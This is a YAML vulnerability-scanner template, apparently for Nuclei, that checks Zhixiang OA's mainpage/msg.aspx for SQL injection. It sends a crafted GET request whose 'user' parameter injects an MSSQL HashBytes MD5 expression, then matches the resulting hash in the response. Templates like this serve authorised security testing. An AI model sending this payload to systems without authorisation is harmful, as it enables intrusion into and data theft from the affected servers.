id: zhixiangOA-SQL-Injection
info:
  author: luckying
  name: zhixiang OA msg.aspx SQL Injection
  reference:
  - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%20msglog.aspx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
  severity: high
  tags: zhixiang,oa,sqli
requests:
- headers:
    Pragma: no-cache
  matchers:
  - part: body
    type: word
    words:
    - '{{md5("{{randstr}}")}}'
  method: GET
  path:
  - '{{BaseURL}}/mainpage/msg.aspx?user=1''+and+(SELECT+sys.fn_sqlvarbasetostr(HashBytes(''MD5'',+''{{randstr}}'')))%3d1+--'
